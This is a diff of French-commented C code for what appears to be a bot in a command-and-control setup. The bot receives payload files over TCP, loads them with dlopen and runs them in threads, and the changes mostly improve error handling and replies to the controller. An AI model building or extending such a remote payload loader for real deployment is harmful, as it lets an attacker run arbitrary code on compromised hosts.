@@ -28,12 +28,12 @@ extern info_bot_t *bot;
 void send_status(int socket_tcp)
 {
     printf("[send_status]Start\n");
-    printf(" Le status que j'ai récup est : %c\n", bot->etat);
     if (write(socket_tcp, &bot->etat, sizeof(char)) < 0)
     {
-        perror("[send_status]ERROR\n");
-        exit(1);
+        perror("[send_status]ERROR");
+        
     }
+    //renvoieSucces(socket_tcp);
 }
 /**
  * void start_charge(char *file_name)
@@ -48,7 +48,7 @@ void start_charge(char *filename)
     charge_utile_t *charge;
     if (rechercheCU(filename, &list_CU, &charge) != 0)
     {
-        perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
+        perror("Une erreur a eu lieu lors de la recherche de la charge utile");
         return;
     }
     // TO DO : vérifier que la charge n'a pas déjà été start (qu'elle tourne pas déjà )
@@ -61,7 +61,6 @@ void start_charge(char *filename)
     {
         perror("Cannot find start");
     }
-    //dlclose(charge.nom);
     //Lancement de la fonction start dans un thread
 
     printf("Lancement du thread sur la fonction chargée\n");
@@ -80,7 +79,7 @@ void start_charge(char *filename)
  * param le nom de la charge utile
  */
 
-void install_charge(char *file_name)
+int install_charge(char *file_name)
 {
     printf("[install_charge]Start\n");
     //chercher dans la liste la structure portant ce nom
@@ -88,7 +87,7 @@ void install_charge(char *file_name)
     if (rechercheCU(file_name, &list_CU, &charge) != 0)
     {
         perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
-        return;
+        return 1;
     }
 
     if (charge == NULL)
@@ -108,15 +107,17 @@ void install_charge(char *file_name)
         charge->plugin = dlopen(new_path, RTLD_NOW);
         if (!charge->plugin)
         {
-            printf("!!! %s\n", dlerror());
-            return;
+            printf("[Install_charge] %s\n", dlerror());
+            return 1;
         }
         print_listeCU(list_CU);
+        return 0;
     }
     else
     {
         //On ne fait rien, la charge est déja installée
         printf("Charge already installed ! \n");
+        return 1;
     }
 }
 /** void rm_charge(char *filename)
@@ -125,7 +126,7 @@ void install_charge(char *file_name)
  *  
 */
 
-void rm_charge(char *filename)
+int rm_charge(char *filename)
 {
     printf("[rm_charge]Start\n");
     charge_utile_t *structure;
@@ -133,7 +134,7 @@ void rm_charge(char *filename)
     if (rechercheCU(filename, &list_CU, &structure) != 0)
     {
         perror("Une erreur a eu lieu lors de la recherche de la charge utile\n");
-        return;
+        return 1;
     }
     if (structure == NULL)
     {
@@ -147,8 +148,7 @@ void rm_charge(char *filename)
         printf("Charge already deleted ! \n");
     }
     printf("La charge utile %s a bien été supprimée ! \n", filename);
-    // TO DO :Répondre au cc
-
+    return 0;
 }
 /** int getChargeFromMessage(int socket, charge_utile_t **returned_charge)
  * Fonction permettant de récupérer une charge utile à partir d'un nom de charge
@@ -194,22 +194,22 @@ int getChargeFromMessage(int socket, charge_utile_t **returned_charge)
 void send_result(int socket_tcp, int *resultat)
 {
     printf("[send_result]Start\n");
-    printf(" Le résultat que je vais envoyer est : %d\n", *resultat);
+
     char str[TAILLE_MSG_PROTOCOLE];
     sprintf(str, "%d", *resultat); // on transforme le resultat en chaine de caractère pour l'envoyer
     if (write(socket_tcp, str, sizeof(str)) < 0)
     {
         perror("[send_status]ERROR\n");
-        exit(1);
     }
 }
 /** void quit_connexion()
  * Fonction wrapper permettant de detruire la liste des charges présentes sur le BOT
- */ 
+ */
 void quit_connexion()
 {
     detruire_liste_CU(&list_CU);
 }
+
 /** void receive_cmd_TCP(void *arg)
  *  Fonction qui reçoit une numéro de commande et en fct de la commande il interprète 
  */
@@ -236,7 +236,7 @@ void receive_cmd_TCP(void *arg)
         if (receiveTCP(socket_tcp, filename, TAILLE_FILENAME) < 0)
         {
             printf("Erreur dans la réception du nom de la charge utile\n");
-            exit(1);
+            renvoieErreur(socket_tcp);
         }
         printf("Le nom de fichier que je vais installer est : %s\n", filename);
         recvFile(&socket_tcp, filename);
@@ -245,13 +245,12 @@ void receive_cmd_TCP(void *arg)
         if (getChargeFromMessage(socket_tcp, &charge) != 0)
         {
             perror("Une erreur est survenue lors du getChargeMessage\n");
-            //renvoieErreur()
+            renvoieErreur(socket_tcp);
         }
         if (charge == NULL)
         {
             perror("Can't start charge utile\n");
-            //TODO : Renvoyer dans la socket le fait que la charge utile est introuvable
-            //renvoieErreur();
+            renvoieErreur(socket_tcp);
         }
         else
         {
@@ -263,13 +262,12 @@ void receive_cmd_TCP(void *arg)
         if (getChargeFromMessage(socket_tcp, &charge) != 0)
         {
             perror("Une erreur est survenue lors du getChargeMessage\n");
-            //renvoieErreur()
+            renvoieErreur(socket_tcp);
         }
         if (charge == NULL)
         {
             perror("Can't rm charge utile\n");
-            //TODO : Renvoyer dans la socket le fait que la charge utile est introuvable
-            //renvoieErreur();
+            renvoieErreur(socket_tcp);
         }
         else
         {
@@ -282,26 +280,28 @@ void receive_cmd_TCP(void *arg)
         if (getChargeFromMessage(socket_tcp, &charge) != 0)
         {
             perror("Une erreur est survenue lors du getChargeMessage\n");
-            //renvoieErreur()
+            renvoieErreur(socket_tcp);
         }
         if (charge == NULL)
         {
             perror("Can't rm charge utile\n");
-            //TODO : Renvoyer dans la socket le fait que la charge utile est introuvable
-            //renvoieErreur();
+            renvoieErreur(socket_tcp);
         }
         else
         {
             print_CU_structure(charge);
-            rm_charge(charge->nom);
+            if(rm_charge(charge->nom) != 0)
+                renvoieErreur(socket_tcp);
+            else
+                renvoieSucces(socket_tcp);
         }
         break;
     case '6': //QUIT connexion => détruire la liste des charges
         quit_connexion();
         break;
+    default:
+        printf("Erreur\n");
+        exit(-1);
+        break;
     }
 }
-
-/* void renvoieErreur(){
-
-} */
